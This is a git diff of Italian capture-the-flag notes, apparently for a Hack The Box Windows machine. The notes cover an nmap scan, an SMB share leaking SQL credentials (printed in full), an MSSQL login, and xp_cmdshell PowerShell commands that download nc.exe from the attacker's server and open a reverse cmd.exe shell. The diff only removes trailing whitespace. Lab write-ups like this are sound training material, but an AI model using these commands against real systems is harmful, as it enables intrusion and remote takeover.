@@ -5,7 +5,7 @@ export IP=10.10.10.27 //creo una variabile temporanea con l'ip cosi lo posso pre
 ....
 Porte aperte
 
-sudo nmap -sC -sV -A $IP -oN namp_scan_1   
+sudo nmap -sC -sV -A $IP -oN namp_scan_1
 
 PORT     STATE SERVICE      VERSION
 135/tcp  open  msrpc        Microsoft Windows RPC
@@ -34,13 +34,13 @@ smbclient -L //$IP/
         Sharename       Type      Comment
         ---------       ----      -------
         ADMIN$          Disk      Remote Admin
-        backups         Disk      
+        backups         Disk
         C$              Disk      Default share
         IPC$            IPC       Remote IPC
 
 --> posso entrare sono il backups
 
-smbclient  //10.10.10.27/backups 
+smbclient  //10.10.10.27/backups
 
 --> entro e torno alla root
 
@@ -54,7 +54,7 @@ smb: \> ls
 
 --> vedo il file prod.dtsConfig ne guardo le informazioni
 
-smb: \> allinfo prod.dtsConfig 
+smb: \> allinfo prod.dtsConfig
 altname: PROD~1.DTS
 create_time:    Mon Jan 20 07:20:57 AM 2020 EST
 access_time:    Mon Jan 20 07:23:02 AM 2020 EST
@@ -80,41 +80,35 @@ stream: [::$DATA], 609 bytes
 ....
 --> vedo che contiene delle credenziali sql, provo a connetermi con mssqlclinet e la password trovata (windows-auth specifico che sono su una macchina windwos)
 
-impacket-mssqlclient sql_svc:M3g4c0rp123@$IP -windows-auth 
+impacket-mssqlclient sql_svc:M3g4c0rp123@$IP -windows-auth
 
---> una volta dentro controllo se è presente powershell 
+--> una volta dentro controllo se è presente powershell
 
 --> è presente ma non riesco a connetermi
 ....
 
 ....
---> scarico nc.exe da github 
+--> scarico nc.exe da github
 
 --> creo un server con python in un altro terminale
 
-python3 -m http.server   
+python3 -m http.server
 
 --> sfrutto la powershel per indirizzarmi sul server
 
 xp_cmdshell powershell wger http://10.10.14.201:8000/nc.exe -OutFile %TEMP%\nc.exe
 
 
---> attivo necat su un terminale alla porta 1234 
+--> attivo necat su un terminale alla porta 1234
 nc -lnvp 1234
 
 --> dalla powershell dico di eseguire cmd.exe
 xp_cmdshell powershell "%TEMP%\nc.exe 10.10.14.201 1234 -e cmd.exe
 
---> una volta avuto accesso al promt giro a caso cercando informazioni 
+--> una volta avuto accesso al promt giro a caso cercando informazioni
 
 C:\Users\sql_svc\Desktop>type user.txt
 
 --> sul desktop dell'utente sql_svc trovo il file contenete la flag
 3e7b102e78218e935bf3f4951fec21a3
 ....
-
-
-
-
-
-
